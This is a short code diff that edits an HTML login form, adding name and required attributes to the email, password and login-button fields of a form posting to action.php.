@@ -18,10 +18,10 @@
             </div>
             <div class="col-form">
                 <div class="form-container">
-                	<form method="POST" action="action.php">
-                    <input type="text" placeholder="Email or Phone number">
-                    <input type="password" placeholder="Password">
-                    <button class="btn-login">Log in
+                	<form action="action.php" method="post" >
+                    <input type="text" name="username" placeholder="Email or Phone number" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button class="btn-login" name="login-btn">Log in
                     </button>
                     <a href="#">Forgot password?</a>
                     <button class="btn-new">
